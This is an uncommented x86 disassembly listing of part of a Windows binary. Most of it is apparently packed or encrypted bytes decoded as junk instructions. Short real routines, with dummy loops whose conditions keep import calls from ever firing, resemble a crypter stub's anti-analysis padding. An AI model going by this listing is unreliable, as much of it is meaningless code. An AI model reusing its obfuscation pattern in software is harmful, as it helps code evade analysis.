  407202:	aad    0xba
  407204:	or     eax,0x2edd0275
  407209:	adc    eax,0xb237a66e
  40720e:	jae    0x40724f
  407210:	mov    esp,esi
  407212:	dec    ecx
  407213:	sub    dl,ch
  407215:	jb     0x4071cf
  407217:	(bad)  
  407218:	cld    
  407219:	jae    0x40727f
  40721b:	aam    0x2c
  40721d:	enter  0x2dba,0xdb
  407221:	xor    edx,DWORD PTR [ebx+ecx*4]
  407224:	xchg   esp,eax
  407225:	clc    
  407226:	and    DWORD PTR [edi+0x76],0x54
  40722a:	and    BYTE PTR [esi+0x6a2adf93],al
  407230:	jno    0x40720f
  407232:	outs   dx,DWORD PTR ds:[esi]
  407233:	add    BYTE PTR ds:0xe718067,0x60
  40723a:	adc    BYTE PTR [edi-0x3a],dl
  40723d:	mov    eax,ds:0x988aacd8
  407242:	pop    edx
  407243:	dec    edx
  407244:	outs   dx,BYTE PTR ds:[esi]
  407245:	sbb    ebp,edx
  407247:	out    dx,al
  407248:	rcl    DWORD PTR [eax+0x2],1
  40724b:	sub    edx,DWORD PTR [edi-0x31]
  40724e:	xlat   BYTE PTR ds:[ebx]
  40724f:	push   ebx
  407250:	and    DWORD PTR [esi-0x70],esp
  407253:	cmc    
  407254:	sbb    esp,DWORD PTR [edi]
  407256:	sbb    ebx,DWORD PTR [eax+0x3f9ff7d4]
  40725c:	jbe    0x407222
  40725e:	dec    esi
  40725f:	shr    DWORD PTR [edx+0x20981443],1
  407265:	add    BYTE PTR [ebx+ecx*4],ch
  407268:	not    cl
  40726a:	add    edx,DWORD PTR [ebx-0xdb5eaf]
  407270:	ret    0x78c4
  407273:	sar    ebp,1
  407275:	sahf   
  407276:	add    al,0x32
  407278:	ds mov esp,0xf10ab78c
  40727e:	push   0x42
  407280:	xchg   BYTE PTR [eax],dh
  407282:	cmp    BYTE PTR [ebp+0x1f49d006],0x4d
  407289:	and    BYTE PTR [edx],ah
  40728b:	push   ecx
  40728c:	push   es
  40728d:	mov    ecx,0xb229a33e
  407292:	in     eax,dx
  407293:	fsubr  DWORD PTR [esi+0x4f7f54ce]
  407299:	and    esp,DWORD PTR [edi+eiz*2+0x73bbabaf]
  4072a0:	adc    BYTE PTR [edx+edx*8-0x12],ah
  4072a4:	inc    esp
  4072a5:	dec    ebx
  4072a6:	mov    ebp,0x781329b
  4072ab:	add    al,0x8c
  4072ad:	adc    eax,0xc4fd3bb6
  4072b2:	sbb    al,ch
  4072b4:	mov    ebx,0xc6c4e5bb
  4072b9:	mov    ds:0xfc7ed8d6,al
  4072be:	popa   
  4072bf:	inc    edx
  4072c0:	and    ch,0xf1
  4072c3:	loope  0x407273
  4072c5:	adc    eax,0xcd8cb2ad
  4072ca:	fcomp  QWORD PTR [edx]
  4072cc:	jb     0x40728b
  4072ce:	xchg   esp,eax
  4072cf:	int    0xaf
  4072d1:	xchg   esp,eax
  4072d2:	mov    ebp,0xf0b8c50e
  4072d7:	inc    esp
  4072d8:	sub    dl,cl
  4072da:	fdivr  st(1),st
  4072dc:	add    DWORD PTR [esi],0xb0fb9297
  4072e2:	cmc    
  4072e3:	popa   
  4072e4:	push   ds
  4072e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072e6:	xor    al,0xd5
  4072e8:	cdq    
  4072e9:	push   ebx
  4072ea:	int3   
  4072eb:	cmp    bl,BYTE PTR [esi+0x5f]
  4072ee:	std    
  4072ef:	jg     0x40734f
  4072f1:	ret    0x9bf7
  4072f4:	dec    esp
  4072f5:	sub    al,0xb9
  4072f7:	jns    0x4072ab
  4072f9:	pop    esp
  4072fa:	xchg   ecx,eax
  4072fb:	pop    ebx
  4072fc:	jge    0x407322
  4072fe:	sbb    esi,DWORD PTR [ebx-0x7f]
  407301:	out    0xb5,al
  407303:	aas    
  407304:	in     al,dx
  407305:	ins    DWORD PTR es:[edi],dx
  407306:	ins    BYTE PTR es:[edi],dx
  407307:	out    dx,al
  407308:	gs adc edx,eax
  40730b:	fmul   DWORD PTR [edi-0x18845d75]
  407311:	jle    0x4072ff
  407313:	or     DWORD PTR [edx+0x1561afca],edi
  407319:	push   esi
  40731a:	and    al,0x88
  40731c:	neg    bh
  40731e:	push   di
  407320:	or     eax,0xc96eedc5
  407325:	jno    0x4072c0
  407327:	push   esi
  407328:	test   al,0xbc
  40732a:	jle    0x407354
  40732c:	js     0x4072bd
  40732e:	and    esp,edi
  407330:	aaa    
  407331:	pop    edx
  407332:	jmp    0xbc3b7b1c
  407337:	mov    BYTE PTR [eax+0x4789b8e8],dh
  40733d:	dec    edx
  40733e:	repz jge 0x4072fc
  407341:	out    dx,al
  407342:	pop    ecx
  407343:	es or  dl,0x33
  407347:	dec    ebx
  407348:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407349:	je     0x406f76
  40734f:	leave  
  407350:	ret    0x4
  407353:	push   ebp
  407354:	mov    ebp,esp
  407356:	sub    esp,0x2c
  407359:	and    DWORD PTR ds:0x433657,0x5787
  407363:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40736a:	mov    eax,ds:0x43372b
  40736f:	or     DWORD PTR ds:0x43372f,eax
  407375:	jmp    0x40759d
  40737a:	pop    edx
  40737b:	cmp    al,0x59
  40737d:	inc    ebx
  40737e:	pop    ecx
  40737f:	arpl   WORD PTR [eax-0x1b],sp
  407382:	js     0x407389
  407384:	push   esi
  407385:	loope  0x407358
  407387:	xor    BYTE PTR [esi-0x6d],cl
  40738a:	or     al,dl
  40738c:	jle    0x40740c
  40738e:	add    eax,0x97e7e7c
  407393:	jecxz  0x4073c3
  407395:	stos   DWORD PTR es:[edi],eax
  407396:	mov    dh,0x32
  407398:	add    BYTE PTR [edx+edi*8-0x2e8017ac],bh
  40739f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073a0:	push   es
  4073a1:	push   ebp
  4073a2:	sahf   
  4073a3:	xchg   edi,eax
  4073a4:	and    al,0x44
  4073a6:	jp     0x4073fa
  4073a8:	adc    eax,0xccae25bd
  4073ad:	sub    eax,0xbed96e8d
  4073b2:	adc    esp,edi
  4073b4:	push   esi
  4073b5:	and    dh,dl
  4073b7:	or     ecx,DWORD PTR [eax]
  4073b9:	leave  
  4073ba:	jmp    0x1335:0x621a99e8
  4073c1:	movq   mm6,mm7
  4073c4:	and    DWORD PTR [eax+0x1f],ebp
  4073c7:	jne    0x407404
  4073c9:	cdq    
  4073ca:	test   BYTE PTR [edi],bh
  4073cc:	(bad)  
  4073cd:	jmp    0x4073f5
  4073cf:	sub    DWORD PTR [edx+ebx*8+0x3],ebx
  4073d3:	and    al,0xf6
  4073d5:	push   ebx
  4073d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073d7:	jecxz  0x4073e3
  4073d9:	push   esi
  4073da:	jne    0x407418
  4073dc:	fcomp  st(4)
  4073de:	xchg   dh,bh
  4073e0:	adc    al,0xb1
  4073e2:	pop    ds
  4073e3:	or     eax,0xd88a5a19
  4073e8:	popa   
  4073e9:	mov    dh,0x99
  4073eb:	push   0xdd13f347
  4073f0:	mov    ch,0xab
  4073f2:	jne    0x407452
  4073f4:	loop   0x40737d
  4073f6:	aaa    
  4073f7:	add    ch,dh
  4073f9:	jmp    0x40738a
  4073fb:	pushf  
  4073fc:	in     al,dx
  4073fd:	(bad)  [edx+0x68]
  407400:	and    ecx,DWORD PTR [esi-0x55]
  407403:	jmp    0x407422
  407405:	sub    ebx,DWORD PTR [eax-0x6c]
  407408:	(bad)  
  407409:	pavgb  mm1,QWORD PTR [ebp-0x5d32e548]
  407410:	push   ss
  407411:	mov    bh,0x8f
  407413:	jno    0x40739d
  407415:	pop    edx
  407416:	sti    
  407417:	stos   BYTE PTR es:[edi],al
  407418:	rol    edx,0x8c
  40741b:	pop    es
  40741c:	imul   edx,DWORD PTR [ecx-0x1b],0xc33f1564
  407423:	inc    ebx
  407424:	pop    esi
  407425:	clc    
  407426:	dec    ebx
  407427:	rcr    DWORD PTR [ecx-0x72],0xba
  40742b:	or     al,0x5d
  40742d:	jmp    0xc5cc:0x945dc3fb
  407434:	inc    BYTE PTR [esi]
  407436:	jmp    0x4073dc
  407438:	xor    ebx,ebp
  40743a:	add    esp,ecx
  40743c:	cld    
  40743d:	(bad)  
  40743e:	popf   
  40743f:	stc    
  407440:	iret   
  407441:	push   cs
  407442:	and    eax,0x69ce24bc
  407447:	loope  0x40740d
  407449:	(bad)  
  40744b:	outs   dx,WORD PTR ds:[esi]
  40744d:	mov    edi,0x7b4f078a
  407452:	es call 0x8249:0xbb0824f8
  40745a:	cdq    
  40745b:	imul   ebp,esp,0x37009ce
  407461:	fwait
  407462:	or     al,0xe3
  407464:	cmp    BYTE PTR [esi],al
  407466:	inc    ecx
  407467:	xchg   esp,eax
  407468:	(bad)  
  407469:	out    0xd5,al
  40746b:	mov    dh,BYTE PTR [eax-0x3d908edf]
  407471:	popa   
  407472:	push   ecx
  407473:	jl     0x40749b
  407475:	std    
  407476:	lds    edi,FWORD PTR [edi]
  407478:	shl    DWORD PTR [eax],0xfb
  40747b:	mul    DWORD PTR [esi-0x723e261d]
  407481:	add    eax,0x5d9666de
  407486:	repnz scas eax,DWORD PTR es:[edi]
  407488:	retf   
  407489:	cmp    al,0xa3
  40748b:	adc    bh,al
  40748d:	adc    DWORD PTR [ebp-0x34],eax
  407490:	(bad)  
  407491:	call   0x2ae1:0x3a9981df
  407498:	bound  eax,QWORD PTR [ebp+0x68e9887a]
  40749e:	inc    ebx
  40749f:	inc    edi
  4074a0:	fisubr WORD PTR [esp+esi*4-0x1da533dd]
  4074a7:	dec    esp
  4074a8:	test   al,0x95
  4074aa:	bound  ecx,QWORD PTR [ecx*2-0x617516f9]
  4074b1:	stos   BYTE PTR es:[edi],al
  4074b2:	push   ds
  4074b3:	mov    esi,0x10cfe940
  4074b8:	pop    eax
  4074b9:	add    al,0x68
  4074bb:	out    0x38,al
  4074bd:	sub    al,BYTE PTR [edx]
  4074bf:	pop    eax
  4074c0:	pop    eax
  4074c1:	push   ebx
  4074c2:	stc    
  4074c3:	sub    al,0x25
  4074c5:	in     al,0xbd
  4074c7:	ror    BYTE PTR ds:0x77f293d8,1
  4074cd:	sar    DWORD PTR [eax],1
  4074cf:	stc    
  4074d0:	aas    
  4074d1:	cld    
  4074d2:	(bad)  [ebp+eax*4-0x20e558aa]
  4074d9:	mov    ecx,0xc1592363
  4074de:	jo     0x40755b
  4074e0:	xlat   BYTE PTR ds:[ebx]
  4074e1:	test   al,0xd5
  4074e3:	ret    0x874
  4074e6:	push   ebx
  4074e7:	dec    esi
  4074e8:	sti    
  4074e9:	or     ebx,ecx
  4074eb:	and    BYTE PTR [ecx],dh
  4074ed:	add    cl,BYTE PTR [edx-0x33]
  4074f0:	clc    
  4074f1:	and    eax,0x1858495
  4074f6:	xchg   edx,eax
  4074f7:	push   cs
  4074f8:	jmp    0x4074c5
  4074fa:	mov    ?,ebx
  4074fc:	mov    edx,0x4c2e9942
  407501:	(bad)  
  407502:	dec    esp
  407503:	push   esi
  407504:	mov    ebp,0x11e6cfb5
  407509:	stos   DWORD PTR es:[edi],eax
  40750a:	mov    ah,0x88
  40750c:	icebp  
  40750d:	fdivr  st,st(4)
  40750f:	int3   
  407510:	push   0x18ae047a
  407515:	jae    0x4074d8
  407517:	sbb    eax,0x2c072107
  40751d:	push   esi
  40751e:	neg    BYTE PTR [esi-0x3d]
  407521:	pop    ss
  407522:	iret   
  407523:	cmp    DWORD PTR [ebp-0x53],ecx
  407526:	xchg   edi,eax
  407527:	pushf  
  407528:	(bad)  
  407529:	adc    al,0x43
  40752b:	add    DWORD PTR [esi+eax*2+0x222f0657],esp
  407532:	aad    0x7
  407534:	and    esp,ebp
  407536:	das    
  407537:	xchg   esi,eax
  407538:	lds    ebp,FWORD PTR [ecx]
  40753a:	stc    
  40753b:	test   BYTE PTR [edi+ecx*8-0x639f622d],bh
  407542:	(bad)  
  407543:	dec    esi
  407544:	jle    0x407554
  407546:	out    dx,eax
  407547:	sub    al,0x55
  407549:	rol    DWORD PTR [esi-0x6546ac2a],1
  40754f:	test   al,0x14
  407551:	ja     0x4075ac
  407553:	nop
  407554:	popa   
  407555:	ja     0x4074f2
  407557:	sahf   
  407558:	retf   
  407559:	mov    ds,WORD PTR [eax]
  40755b:	push   ebp
  40755c:	sahf   
  40755d:	test   al,0xf0
  40755f:	fs push edx
  407561:	mov    ah,0x18
  407563:	fiadd  DWORD PTR [edx+0x1c]
  407566:	fstp   st(5)
  407568:	mov    ch,0x7c
  40756a:	es mov edx,0x5106fc08
  407570:	add    dh,BYTE PTR [ebp+0x2b4b733e]
  407576:	or     ch,bh
  407578:	ss ss int 0xff
  40757c:	add    ebp,DWORD PTR ds:0x5ee9206
  407582:	fwait
  407583:	leave  
  407584:	xchg   esp,eax
  407585:	test   BYTE PTR ds:0xaa3c44b4,dh
  40758b:	loop   0x407579
  40758d:	sahf   
  40758e:	test   al,0x9a
  407590:	std    
  407591:	test   DWORD PTR [eax+0x24149cf5],0x3fac8729
  40759b:	repz push eax
  40759d:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4075a4:	xor    eax,0x551
  4075a9:	mov    eax,0x9577
  4075ae:	mov    ecx,DWORD PTR ds:0x433653
  4075b4:	sub    DWORD PTR ds:0x43360f,ecx
  4075ba:	mov    WORD PTR [ebp-0x4],ax
  4075be:	and    ecx,0x22ab
  4075c4:	lea    eax,[ebp-0x24]
  4075c7:	sub    ecx,DWORD PTR ds:0x4335ff
  4075cd:	mov    DWORD PTR [ebp-0x28],eax
  4075d0:	mov    eax,DWORD PTR [ebp+0x8]
  4075d3:	and    DWORD PTR ds:0x43366b,0x78d4
  4075dd:	mov    DWORD PTR [ebp-0x20],eax
  4075e0:	and    DWORD PTR ds:0x43360f,0x0
  4075ea:	jmp    0x4075fc
  4075ef:	mov    ecx,DWORD PTR ds:0x43360f
  4075f5:	inc    ecx
  4075f6:	mov    DWORD PTR ds:0x43360f,ecx
  4075fc:	cmp    DWORD PTR ds:0x43360f,0x1c
  407603:	jae    0x40763a
  407609:	cmp    DWORD PTR ds:0x43360f,0x21
  407610:	jne    0x40762f
  407616:	push   DWORD PTR [ebp-0x18]
  407619:	push   0x26d9
  40761e:	push   DWORD PTR [ebp-0x1c]
  407621:	push   0x600b
  407626:	push   DWORD PTR [ebp-0x14]
  407629:	call   DWORD PTR ds:0x412348
  40762f:	jmp    0x4075ef
  407634:	xor    ecx,0x31bd
  40763a:	push   ebx
  40763b:	lea    eax,[ebp-0x18]
  40763e:	mov    DWORD PTR [ebp-0x1c],eax
  407641:	mov    eax,DWORD PTR [ebp-0x1c]
  407644:	jmp    0x40786c
  407649:	aad    0xb8
  40764b:	(bad)  
  40764c:	shl    BYTE PTR [ebx-0x20],0x75
  407650:	dec    ecx
  407651:	js     0x407697
  407653:	js     0x407668
  407655:	jl     0x4076b4
  407657:	arpl   WORD PTR [ebx],si
  407659:	adc    eax,eax
  40765b:	jle    0x4076db
  40765d:	add    eax,0x6d7e7e7c
  407662:	cld    
  407663:	push   esi
  407664:	loopne 0x4075f6
  407666:	sbb    al,0x5
  407668:	sbb    ch,ch
  40766a:	mov    al,ds:0xc0d4b03a
  40766f:	push   es
  407670:	adc    al,0xaa
  407672:	aaa    
  407673:	dec    esi
  407674:	cmp    esp,DWORD PTR [edx-0x7b]
  407677:	retf   0xa280
  40767a:	sub    al,0x19
  40767c:	ins    DWORD PTR es:[edi],dx
  40767d:	call   0xec73:0xbd37c963
  407684:	imul   eax,DWORD PTR [eax],0xffffffcb
  407687:	into   
  407688:	and    esi,ecx
  40768a:	push   edi
  40768b:	xor    al,ah
  40768d:	adc    eax,0x26413b84
  407692:	and    al,0x4c
  407694:	xor    cl,ch
  407696:	dec    ebp
  407697:	push   ds
  407698:	test   esp,esi
  40769a:	push   ecx
  40769b:	xchg   ebx,eax
  40769c:	jnp    0x407660
  40769e:	jg     0x407698
  4076a0:	mov    eax,0xd2e9f70b
  4076a5:	push   ecx
  4076a6:	retf   0xca97
  4076a9:	or     al,0x62
  4076ab:	adc    dh,ch
  4076ad:	daa    
  4076ae:	pop    ebx
  4076af:	mov    BYTE PTR [eax+eax*2+0x8],bh
  4076b3:	in     eax,dx
  4076b4:	mov    fs,WORD PTR [eax-0x6]
  4076b7:	mov    bl,0x2d
  4076b9:	mov    dl,0x4b
  4076bb:	sub    dh,ah
  4076bd:	hlt    
  4076be:	out    dx,eax
  4076bf:	inc    ebx
  4076c0:	and    ecx,edx
  4076c2:	jmp    0x4076d7
  4076c4:	fwait
  4076c5:	repnz popa 
  4076c7:	xchg   edx,eax
  4076c8:	inc    ebx
  4076c9:	in     eax,dx
  4076ca:	adc    al,0xcd
  4076cc:	lods   eax,DWORD PTR ds:[esi]
  4076cd:	aas    
  4076ce:	arpl   WORD PTR [ebx-0x1da954ff],cx
  4076d4:	cs test eax,0x4258791c
  4076da:	ror    BYTE PTR [esi-0x13],1
  4076dd:	dec    eax
  4076de:	xor    BYTE PTR [esi+0x3c072b4],cl
  4076e4:	sbb    ebp,edi
  4076e6:	jle    0x40772e
  4076e8:	leave  
  4076e9:	mov    ds:0x5edc5341,eax
  4076ee:	scas   eax,DWORD PTR es:[edi]
  4076ef:	inc    ecx
  4076f0:	dec    edx
  4076f1:	fisubr DWORD PTR [esi+0x79]
  4076f4:	push   esp
  4076f5:	xchg   BYTE PTR ds:0x72543502,bl
  4076fb:	fadd   st,st(6)
  4076fd:	add    al,0xe5
  4076ff:	jl     0x407760
  407701:	pusha  
  407702:	push   ds
  407703:	fs pop ebx
  407705:	scas   al,BYTE PTR es:[edi]
  407706:	rol    BYTE PTR [edi-0x7c29c5e6],0xb2
  40770d:	ins    BYTE PTR es:[edi],dx
  40770e:	mov    edi,0x7d91454f
  407713:	mov    ebx,0x9f85d383
  407718:	or     DWORD PTR [ecx+0x56c4c3f2],0x5b
  40771f:	push   0xffffffd3
  407721:	adc    dh,BYTE PTR [edx+0x7a9e9ada]
  407727:	sahf   
  407728:	pop    esi
  407729:	adc    esp,eax
  40772b:	inc    edi
  40772c:	and    dl,0x84
  40772f:	xchg   esi,eax
  407730:	sahf   
  407731:	sub    al,0xe7
  407733:	scas   eax,DWORD PTR es:[edi]
  407734:	into   
  407735:	cdq    
  407736:	sbb    eax,0xb3b73e67
  40773b:	pop    ebp
  40773c:	pusha  
  40773d:	xor    DWORD PTR [ecx-0x47],eax
  407740:	(bad)  
  407741:	sahf   
  407742:	add    edi,edx
  407744:	and    eax,0xfde4901d
  407749:	jb     0x4076f3
  40774b:	or     ah,BYTE PTR [edx]
  40774d:	sbb    al,0x49
  40774f:	mov    al,BYTE PTR [esi]
  407751:	cli    
  407752:	mov    ecx,0x140c24fd
  407757:	inc    eax
  407758:	rcr    DWORD PTR [ecx],1
  40775a:	adc    al,0x7b
  40775c:	cmc    
  40775d:	or     BYTE PTR [edx+0x19e26c36],dh
  407763:	outs   dx,BYTE PTR ds:[esi]
  407764:	stc    
  407765:	inc    esp
  407766:	inc    edi
  407767:	xchg   ebp,eax
  407768:	or     ch,BYTE PTR [eax-0x56]
  40776b:	shr    BYTE PTR [eax],cl
  40776d:	and    BYTE PTR [ebx-0x1e3a3215],0xd9
  407774:	xor    al,0xa2
  407776:	lock or dl,BYTE PTR [esi]
  407779:	scas   al,BYTE PTR es:[edi]
  40777a:	mov    esp,0x99a9e881
  40777f:	pop    eax
  407780:	jbe    0x4077e5
  407782:	pop    ecx
  407783:	(bad)  
  407784:	int    0x2c
  407786:	(bad)  
  407788:	mov    cl,0x1e
  40778a:	and    cl,0x47
  40778d:	sbb    esi,DWORD PTR [edx]
  40778f:	or     bl,BYTE PTR [eax-0xd]
  407792:	imul   edi,DWORD PTR [esi+ecx*1],0x3e
  407796:	js     0x4077ba
  407798:	aad    0x42
  40779a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40779b:	call   0x3302:0x1c270ace
  4077a2:	loopne 0x40780c
  4077a4:	fnstcw WORD PTR [ecx+0x1b]
  4077a7:	push   ecx
  4077a8:	push   ds
  4077a9:	add    DWORD PTR [esi+0x5e],0xffffffa6
  4077ad:	mov    es,WORD PTR [edx]
  4077af:	sbb    al,0x8a
  4077b1:	mov    WORD PTR [esi-0x728c70d3],fs
  4077b7:	mov    esp,DWORD PTR [ebp-0x37]
  4077ba:	sar    bl,0xde
  4077bd:	nop
  4077be:	leave  
  4077bf:	repnz fisubr DWORD PTR [esi]
  4077c2:	daa    
  4077c3:	jnp    0x407832
  4077c5:	xchg   ecx,eax
  4077c6:	jb     0x407821
  4077c8:	inc    ebp
  4077c9:	das    
  4077ca:	mov    ecx,0x23db857a
  4077cf:	cmp    ecx,ebp
  4077d1:	pop    ds
  4077d2:	and    al,0xb7
  4077d4:	pop    esi
  4077d6:	in     eax,0xce
  4077d8:	outs   dx,DWORD PTR ds:[esi]
  4077d9:	pop    es
  4077da:	inc    edx
  4077db:	mov    eax,0xdca2370
  4077e0:	in     eax,dx
  4077e1:	jmp    0xcd12:0xffc08520
  4077e8:	les    ebp,FWORD PTR [esi]
  4077ea:	inc    ebx
  4077eb:	aaa    
  4077ec:	outs   dx,DWORD PTR ds:[esi]
  4077ed:	jl     0x4077db
  4077ef:	or     bl,ch
  4077f1:	enter  0x2257,0x9a
  4077f5:	daa    
  4077f6:	daa    
  4077f7:	mov    ebx,0x4301b8e8
  4077fc:	or     BYTE PTR [ecx+0x5b],bh
  4077ff:	inc    edi
  407800:	inc    ebx
  407801:	pop    edx
  407802:	inc    edi
  407803:	pop    edi
  407804:	fstp   QWORD PTR [ecx+ebp*1-0x72c74b61]
  40780b:	mov    esp,0xb23d257a
  407810:	call   0xfac3:0x2647905d
  407817:	dec    ecx
  407818:	int    0x34
  40781a:	push   ebx
  40781b:	push   ebp
  40781c:	mov    DWORD PTR [eax],ecx
  40781e:	jb     0x4077d8
  407820:	sub    DWORD PTR [edi+ebp*4],eax
  407823:	ins    DWORD PTR es:[edi],dx
  407824:	popa   
  407825:	dec    ecx
  407826:	outs   dx,DWORD PTR ds:[esi]
  407827:	xchg   esi,eax
  407828:	sahf   
  407829:	pop    ds
  40782a:	xchg   DWORD PTR [ebx+0xd],eax
  40782d:	cmp    esp,DWORD PTR es:[esi-0x371d4d8b]
  407834:	cli    
  407835:	dec    ebx
  407836:	mov    eax,ds:0xc7fb82e1
  40783b:	scas   eax,DWORD PTR es:[edi]
  40783c:	retf   0x467c
  40783f:	in     eax,dx
  407840:	mov    eax,ds:0xe8903c9b
  407845:	lea    edi,[ecx+0x36]
  407848:	sub    dh,BYTE PTR [ebp+0x77]
  40784b:	ins    BYTE PTR es:[edi],dx
  40784c:	rcl    DWORD PTR [ecx+0x12],cl
  40784f:	mov    ds:0x63d9ced4,eax
  407854:	pop    ebp
  407855:	call   0xbd9f45ec
  40785a:	aam    0x77
  40785c:	pop    eax
  40785d:	jmp    0x8a43:0x96a60c35
  407864:	rol    DWORD PTR [edx+0x2ddb231a],cl
  40786a:	js     0x4078a3
  40786c:	push   esi
  40786d:	sub    ecx,esi
  40786f:	push   edi
  407870:	mov    edi,0xf89f2da9
  407875:	xor    DWORD PTR ds:0x4335ff,0x433663
  40787f:	mov    DWORD PTR [eax],edi
  407881:	mov    DWORD PTR ds:0x43371b,0x12
  40788b:	cmp    DWORD PTR ds:0x43371b,0x0
  407892:	je     0x4078c1
  407898:	cmp    DWORD PTR ds:0x43371b,0x14
  40789f:	jne    0x4078b1
  4078a5:	push   DWORD PTR [ebp-0x28]
  4078a8:	push   DWORD PTR [ebp-0x1c]
  4078ab:	call   DWORD PTR ds:0x41234c
  4078b1:	mov    eax,ds:0x43371b
  4078b6:	dec    eax
  4078b7:	mov    ds:0x43371b,eax
  4078bc:	jmp    0x40788b
  4078c1:	mov    eax,DWORD PTR [ebp-0x14]
  4078c4:	mov    ebx,DWORD PTR [ebp-0x8]
  4078c7:	and    DWORD PTR ds:0x43369f,0x0
  4078d1:	xor    esi,esi
  4078d3:	xor    esi,DWORD PTR ds:0x43369f
  4078d9:	inc    esi
  4078da:	mov    DWORD PTR ds:0x43369f,esi
  4078e0:	cmp    DWORD PTR ds:0x43369f,0x1c
  4078e7:	jne    0x4078f6
  4078ed:	push   DWORD PTR [ebp-0x28]
  4078f0:	call   DWORD PTR ds:0x4120d0
  4078f6:	cmp    DWORD PTR ds:0x43369f,0x18
  4078fd:	jb     0x4078d1
  407903:	xor    esi,0x6b5
  407909:	mov    ecx,0x7510854
  40790e:	neg    esi
  407910:	jmp    0x407b38
  407915:	loopne 0x4078c8
  407917:	test   DWORD PTR [edx+0x71f1b255],esi
  40791d:	cmp    dh,cl
  40791f:	pop    ebp
  407920:	out    0x54,eax
  407922:	and    dl,cl
  407924:	shl    DWORD PTR [esi+ecx*8],1
  407927:	jle    0x4079a7
  407929:	add    eax,0x637e7e7c
  40792e:	jp     0x4078b6
  407930:	mov    cl,0xc7
  407932:	es out dx,al
  407934:	mov    bh,0xb2
  407936:	pop    eax
  407937:	adc    eax,0xfeab0423
  40793c:	lds    ecx,FWORD PTR [eax+0x64]
  40793f:	stos   DWORD PTR es:[edi],eax
  407940:	push   ss
  407941:	push   ss
  407942:	mov    cl,0xec
  407944:	add    cl,BYTE PTR [ebx-0x7f]
  407947:	(bad)  
  407948:	mov    ebp,0xbd744e7f
  40794d:	and    DWORD PTR [esi],0x1c
  407950:	(bad)  
  407952:	loope  0x407953
  407954:	js     0x40796f
  407956:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407957:	mov    edx,0x5eab63ac
  40795c:	pop    ss
  40795d:	push   eax
  40795e:	out    dx,eax
  40795f:	and    ebx,DWORD PTR [esi-0x26]
  407962:	mov    eax,0xb55f37c7
  407967:	clc    
  407968:	ret    0xdf38
  40796b:	inc    ebp
  40796c:	add    DWORD PTR [ecx+eiz*4-0x20],ebp
  407970:	xor    al,0x34
  407972:	stos   BYTE PTR es:[edi],al
  407973:	retf   
  407974:	mov    eax,0x4d324fbf
  407979:	mov    dl,0xf6
  40797b:	and    BYTE PTR [ebp-0x272f27a5],dl
  407981:	mov    edi,0xe8308ff5
  407986:	pushf  
  407987:	jmp    0xf00e3906
  40798c:	mov    ch,0x24
  40798e:	outs   dx,BYTE PTR ds:[esi]
  40798f:	inc    eax
  407990:	xlat   BYTE PTR ds:[ebx]
  407991:	add    BYTE PTR [edi+0x6b],bl
  407994:	mov    ds:0xe9ceb138,al
  407999:	mov    dh,0x3d
  40799b:	sbb    ebp,DWORD PTR fs:[ecx+0x1e]
  40799f:	adc    BYTE PTR [edx+0xc90540b],0x30
  4079a6:	and    eax,0xa334e4a6
  4079ab:	jmp    0x597d:0xdb8b59e9
  4079b2:	(bad)  
  4079b3:	fcom   st(3)
  4079b5:	mov    dh,0x91
  4079b7:	jp     0x4079d7
  4079b9:	pop    esp
  4079ba:	shl    BYTE PTR [eax],0xaa
  4079bd:	dec    edx
  4079be:	cli    
  4079bf:	jne    0x407998
  4079c1:	sub    al,0xef
  4079c3:	call   0x5d6c:0x86ece3ce
  4079ca:	fcom   DWORD PTR [ecx+0x3d]
  4079cd:	xor    DWORD PTR [edx],0xa0d3efd6
  4079d3:	xchg   edi,eax
  4079d4:	adc    al,cl
  4079d6:	jp     0x407a0f
  4079d8:	retf   0xdcb6
  4079db:	dec    eax
  4079dc:	fwait
  4079dd:	repnz xchg ecx,eax
  4079df:	call   0x91a0139f
  4079e4:	adc    dh,BYTE PTR [edi+eiz*4-0x65f0cba2]
  4079eb:	adc    DWORD PTR [ebx+0x43],ecx
  4079ee:	or     eax,ebp
  4079f0:	mov    bh,0x26
  4079f2:	push   esp
  4079f3:	dec    ebx
  4079f4:	pop    ecx
  4079f5:	out    dx,al
  4079f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079f7:	sub    edi,DWORD PTR [edi-0x48a4c7b2]
  4079fd:	test   al,0x58
  4079ff:	fcmovnu st,st(1)
  407a01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a02:	out    0x6f,eax
  407a04:	pop    ebx
  407a05:	scas   al,BYTE PTR es:[edi]
  407a06:	sub    DWORD PTR [ecx-0x554472bf],ebx
  407a0c:	nop
  407a0d:	jne    0x4079af
  407a0f:	push   esi
  407a10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a11:	imul   esp,eax,0x6303c0e0
  407a17:	jl     0x4079de
  407a19:	sub    DWORD PTR [esi+0xd],edi
  407a1c:	xlat   BYTE PTR ds:[ebx]
  407a1d:	inc    ebx
  407a1e:	lock jecxz 0x4079ef
  407a21:	icebp  
  407a22:	inc    edx
  407a23:	(bad)  
  407a24:	and    bh,BYTE PTR [ebx]
  407a26:	add    cl,ah
  407a28:	adc    eax,0x37102f5b
  407a2d:	sub    ebp,0xb3dc06b
  407a33:	xchg   ecx,eax
  407a34:	scas   al,BYTE PTR es:[edi]
  407a35:	imul   ecx,DWORD PTR [ebx-0x3e],0xffffffb4
  407a39:	inc    esi
  407a3a:	(bad)  
  407a3b:	es (bad) 
  407a3d:	and    bh,dl
  407a3f:	xchg   ebx,eax
  407a40:	retf   
  407a41:	popf   
  407a42:	pop    ebx
  407a43:	xor    BYTE PTR [ebp-0x31],0x8a
  407a47:	pop    esi
  407a48:	rcl    DWORD PTR [edx],0xa4
  407a4b:	out    dx,eax
  407a4c:	mov    edx,0x58c16214
  407a51:	sbb    edx,DWORD PTR [edx+0x299dac2f]
  407a57:	sbb    ah,BYTE PTR [ebx+0x7c06b3d1]
  407a5d:	rcr    BYTE PTR [edi-0x335dae36],1
  407a63:	loope  0x407a16
  407a65:	and    eax,0x9e502ffa
  407a6a:	sbb    eax,0x3afc0209
